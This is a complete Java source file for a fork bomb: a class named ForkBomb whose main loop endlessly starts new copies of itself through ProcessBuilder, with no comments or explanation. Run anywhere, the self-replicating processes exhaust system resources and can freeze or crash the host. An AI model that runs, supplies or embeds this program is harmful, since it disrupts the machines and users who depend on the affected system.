import java.io.IOException;

public class ForkBomb {
    public static void main(String[] args) throws IOException {
        while (true) {
            new ProcessBuilder("java", "ForkBomb").start();
        }
    }
}
